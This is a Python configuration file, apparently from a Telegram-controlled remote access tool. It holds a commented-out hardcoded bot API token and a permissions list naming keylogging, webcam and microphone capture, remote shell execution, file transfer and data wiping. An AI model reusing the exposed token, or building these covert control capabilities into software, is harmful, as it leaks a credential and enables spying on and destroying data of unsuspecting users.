#!/usr/bin/python3
# -*- coding: utf-8 -*-
from os import path
from services.startup import CURRENT_DIRECTORY

# Read telegram bot api token
def ReadTelegramBotAPI_Token() -> str:
    token_file = path.join(CURRENT_DIRECTORY, "token.txt")
    if not path.exists(token_file):
        return ""
    with open(token_file, "r") as api_token:
        return api_token.read()

# Telegram Bot API token
token = ReadTelegramBotAPI_Token()  #"1372352235:AAF_a2mqhyak1sBJl0IaDah85Ioy2MMB7Yc"
# Request password from user after expiration
auth_expire_time = 3600
# Permissions list
perms = {
    "TASKMANAGER": "Kill running processes",
    "FILEMANAGER": "List files, directories",
    "FILETRANSFER": "Download & Upload files, dirs",
    "INFORMATION": "Get system information",
    "MICROPHONE": "Record audio from microphone",
    "SCREENSHOT": "Get desktop screenshot",
    "WEBCAMERA": "Get webcam screenshots & videos",
    "UNINSTALL": "Uninstall from system",
    "KEYLOGGER": "Record keyboard events",
    "KEYBOARD": "Control keyboard buttons",
    "LOCATION": "Get location based on BSSID",
    "VOLUME": "Control system volume",
    "SHELL": "Execute system commands",
    "POWER": "Control computer power",
    "WIPE": "Wipe user data",
}